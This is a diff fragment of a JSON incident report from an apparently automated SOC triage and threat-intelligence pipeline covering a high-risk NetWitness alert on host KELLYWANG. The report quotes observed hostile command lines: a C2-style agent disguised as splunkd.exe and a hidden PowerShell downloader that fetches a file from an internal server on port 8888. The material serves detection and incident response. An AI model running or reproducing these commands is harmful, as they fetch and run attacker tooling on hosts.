+        "status_reason": "Not enriched — file reputation lookups require a file hash",
+        "providers_queried": 0,
+        "providers_answered": 0
+      }
+    ],
+    "coverage": {
+      "extracted": 10,
+      "eligible": 4,
+      "enriched": 4,
+      "excluded": 6,
+      "skipped": 0,
+      "skipped_by_limit": 0,
+      "provider_requests": 8,
+      "limit_per_type": 10,
+      "by_type": {
+        "hash": {
+          "extracted": 4,
+          "enriched": 4,
+          "excluded": 0,
+          "skipped": 0
+        },
+        "ip": {
+          "extracted": 2,
+          "enriched": 0,
+          "excluded": 2,
+          "skipped": 0
+        },
+        "domain": {
+          "extracted": 2,
+          "enriched": 0,
+          "excluded": 2,
+          "skipped": 0
+        },
+        "file_name": {
+          "extracted": 2,
+          "enriched": 0,
+          "excluded": 2,
+          "skipped": 0
+        }
+      }
+    },
+    "provider_coverage": {
+      "virustotal": {
+        "label": "VirusTotal",
+        "configured": true,
+        "state": "available",
+        "applicable": 4,
+        "queried": 4,
+        "returned_data": 4,
+        "not_found": 0,
+        "failed": 0,
+        "not_configured": 0
+      },
+      "abuseipdb": {
+        "label": "AbuseIPDB",
+        "configured": true,
+        "state": "not_applicable",
+        "applicable": 0,
+        "queried": 0,
+        "returned_data": 0,
+        "not_found": 0,
+        "failed": 0,
+        "not_configured": 0
+      },
+      "otx": {
+        "label": "AlienVault OTX",
+        "configured": true,
+        "state": "available",
+        "applicable": 4,
+        "queried": 4,
+        "returned_data": 4,
+        "not_found": 0,
+        "failed": 0,
+        "not_configured": 0
+      }
+    }
+  },
+  "enrichment_risk_score": 60,
+  "enrichment_risk_level": "Medium",
+  "enrichment_risk_reasons": [
+    "VirusTotal reported 48 malicious detection(s) for the file hash.",
+    "AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb."
+  ],
+  "investigation_context_brief": "=== INVESTIGATION CONTEXT BRIEF (canonical stage results; bounded) ===\n[CASE]\nCase ID (Investigation subject): INC-53021\nTitle: High Risk Alerts: NetWitness Endpoint for KELLYWANG\nIncident time: 2025-12-01T07:33:39+00:00\nNetWitness: risk score 70; priority HIGH; created 2025-12-01T07:33:39.338+00:00; sources ECAT; alerts 6\n[TRIAGE]\nTriage level: HIGH (Triage classification -- not the NetWitness severity)\nCategory: Internal Hacking (inactive)\nRisk dimensions: initiation High, occurrence High, adverse impact High, overall High\nRisk rationale: High-severity NetWitness alert with risk score 70, multiple IOC matches, suspicious hidden PowerShell execution, and anomalous process/network activity on internal host 192.168.10.204 to 192.168.10.202:8888 indicate a highly likely malicious event with likely operational impact.\nMITRE (Triage): tactic Command and Control; technique T1105 Ingress Tool Transfer\nTriage interpretation (Triage agent's assessment, not a factual incident description): This alert shows suspicious endpoint activity on an internal host involving hidden PowerShell with ExecutionPolicy Bypass and a likely downloader pattern contacting an internal IP on port 8888. The process 'splunkd.exe' executing from Public with related IOCs and a privileged user context indicates probable mal…\nTriage IOC checklist findings: [CONFIDENTIALITY] Changes in network traffic telemetry (known bad IPs/domains), Unknown traffic originating from/terminating on the device, Unexplained changes from privileged accounts — There is network traffic to an internal destination on port 8888 with a suspicious PowerShell download pattern, consistent with unusual communications and possible exfil/remote cont…\nNetWitness source risk score: 70\n[ENTITIES & TELEMETRY]\nOrigins: P=Parsing, T=Triage metakeys, NW=NetWitness alert metadata, INC=incident record, H=raw-incident heuristic, H-title=incident title heuristic\nSource IPs (3): 192.168.10.204 [T,P,NW,H]; 192.168.10.202 [H]; 192.168.20.16 [H]\nDestination IPs (1): 192.168.10.202 [T,P,NW,H]\nUsers (1): KELLYWANG\\Kelly Wang [T,P,NW,H]\nEndpoint hosts (1): KELLYWANG [T,INC,P,NW,H-title]\nDomains (role not asserted) (1): KELLYWANG [T,P]\nFile hashes (4): 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 [T,P,NW]; 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 [T,NW]; 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb [T,P,NW]; 6bb54b2d7a3d63578559239a79700ea3 [T,NW]\nFiles (2): splunkd.exe [T,NW]; powershell.exe [T,NW]\nCommand line: splunkd.exe -server http://192.168.10.202:8888 -group red\nCommand line: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server='http://192.168.10.202:8888'; $url=$server + '/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file'…\nNetwork detail [Triage metakeys / NetWitness alert metadata]: destination domain KELLYWANG\nOperating system: windows\nNetWitness alerts listed after this brief: 6\n[THREAT INTELLIGENCE]\n=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.\nTI stage status: completed\nTI contract: multi-indicator (per-IOC roles, origins and provider verdicts)\nCoverage: extracted 10, eligible 4, enriched 4, excluded 6, skipped 0 (by limit 0; limit 10 per type)\nProvider coverage: AbuseIPDB not_applicable (queried 0/0, failed 0); AlienVault OTX available (queried 4/4, failed 0); VirusTotal available (queried 4/4, failed 0)\nIntelligence gaps: none recorded\nNOT enriched: 2 excluded/internal_hostname, 2 excluded/private, 2 excluded/unsupported_type -- e.g. 192.168.10.204, 192.168.10.202, ['kellywang'], ['splunkd.exe'], kellywang, ['powershell.exe']\nTI warnings: none recorded\nTI recommended next action: Medium enrichment risk was identified — review the risk reasons below.\nEnriched indicators (4, highest provider evidence first):\n- 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 | hash | role: not recorded | origin: NetWitness alert metadata | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+3) | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+2) | VT: 0 malicious, 0 suspicious of 71 | OTX: 1 pulses\n- 6bb54b2d7a3d63578559239a79700ea3 | hash | role: not recorded | origin: NetWitness alert metadata | VT: 0 malicious, 0 suspicious of 71 | OTX: 0 pulses\n[DATA QUALITY / LIMITATIONS]\nParser confidence: High\nParsing warnings: Missing context-relevant parsing fields: protocol\nParsing missing fields (not present in telemetry): protocol\n=== END INVESTIGATION CONTEXT BRIEF ==="
+}
